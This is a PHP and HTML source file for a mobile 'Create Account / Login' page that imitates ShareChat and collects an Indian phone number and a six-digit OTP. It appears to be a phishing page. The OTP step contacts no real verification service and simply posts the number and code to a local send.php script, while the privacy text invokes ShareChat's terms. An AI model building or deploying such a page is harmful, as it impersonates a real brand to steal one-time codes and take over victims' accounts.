<?php
session_start();

if(isset($_POST['number'])) {
    $_SESSION['number'] = $_POST['number'];
    header("Location: msg.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Create Account / Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#f3f3f3;
}

.container{
    max-width:420px;
    margin:auto;
    min-height:100vh;
    padding:25px 20px;
    position:relative;
}

.top-bar{
    display:flex;
    align-items:center;
    gap:15px;
    margin-bottom:40px;
}

.close{
    font-size:38px;
    color:#222;
    cursor:pointer;
}

.top-title{
    font-size:22px;
    font-weight:700;
    color:#111;
}

.logo{
    width:120px;
    display:block;
    margin:20px auto;
    border-radius:20px;
}

h1{
    text-align:center;
    font-size:52px;
    font-weight:700;
    color:#111;
    margin-top:10px;
}

.subtext{
    text-align:center;
    font-size:18px;
    color:#555;
    margin-top:15px;
}

.input-box{
    display:flex;
    gap:15px;
    margin-top:40px;
}

.country{
    width:120px;
    background:#ececec;
    border-radius:16px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:20px;
    font-weight:600;
    padding:18px;
}

.country img{
    width:28px;
    margin-right:8px;
}

.phone{
    flex:1;
}

.phone input,
#otp{
    width:100%;
    padding:20px;
    border:none;
    border-radius:16px;
    background:#ececec;
    font-size:20px;
    outline:none;
}

.or-line{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:15px;
    margin:35px 0;
}

.or-line .line{
    flex:1;
    height:1px;
    background:#bdbdbd;
}

.or-line span{
    font-size:18px;
    font-weight:600;
    color:#333;
}

.google-btn{
    width:100%;
    background:#fff;
    border:2px solid #0b5d8d;
    border-radius:18px;
    padding:18px;
    font-size:18px;
    font-weight:700;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:12px;
}

.google-btn img{
    width:30px;
}

#mainBtn{
    width:100%;
    margin-top:25px;
    padding:18px;
    border:none;
    border-radius:16px;
    background:#d8d8d8;
    color:#666;
    font-size:18px;
    font-weight:700;
}

#mainBtn.active{
    background:#0066ff;
    color:#fff;
}

#otpSection{
    display:none;
    margin-top:20px;
}

.privacy{
    position:absolute;
    bottom:25px;
    left:20px;
    right:20px;
    text-align:center;
    font-size:15px;
    color:#222;
    line-height:1.5;
}

.privacy b{
    font-weight:700;
}
</style>
</head>
<body>

<div class="container">

    <div class="top-bar">
        <div class="close">×</div>
        <div class="top-title">Create Account / Login</div>
    </div>

    <img src="logo.png" class="logo" alt="logo">

    <h1>Welcome!</h1>
    <div class="subtext">Login for an amazing experience</div>

    <form action="send.php" method="POST">

        <div class="input-box">
            <div class="country">
                <img src="flag.png" alt="flag">
                +91
            </div>

            <div class="phone">
                <input
                    type="text"
                    name="number"
                    id="phone"
                    placeholder="Enter your phone number"
                    maxlength="10"
                    oninput="checkPhone()">
            </div>
        </div>

        <button type="button" id="mainBtn" onclick="nextStep()">Get OTP</button>

        <div id="otpSection">
            <input
                type="text"
                name="otp"
                id="otp"
                placeholder="Enter OTP"
                maxlength="6"
                oninput="checkOTP()">
        </div>

    </form>

    <div class="or-line">
        <div class="line"></div>
        <span>Or</span>
        <div class="line"></div>
    </div>

    <button class="google-btn">
        <img src="google.png" alt="google">
        Continue with Google
    </button>

    <div class="privacy">
        Your Privacy is important to us and your number will be safe. By continuing, you agree to ShareChat <b>Terms and Conditions</b>, <b>Privacy Policy</b> and <b>Content & Community Guidelines.</b>
    </div>

</div>

<script>
let otpShown = false;

function nextStep(){
    let phone = document.getElementById("phone").value;

    if(!otpShown){
        if(phone.length < 10) return;

        document.getElementById("otpSection").style.display = "block";
        document.getElementById("mainBtn").innerText = "Verify OTP";
        otpShown = true;
    }else{
        let otp = document.getElementById("otp").value;
        if(otp.length < 6) return;

        document.forms[0].submit();
    }
}

function checkPhone(){
    let phone = document.getElementById("phone").value;
    let btn = document.getElementById("mainBtn");

    if(phone.length == 10){
        btn.classList.add("active");
    }else{
        btn.classList.remove("active");
    }
}

function checkOTP(){
    let otp = document.getElementById("otp").value;
    let btn = document.getElementById("mainBtn");

    if(otp.length == 6){
        btn.classList.add("active");
    }else{
        btn.classList.remove("active");
    }
}
</script>

</body>
</html>
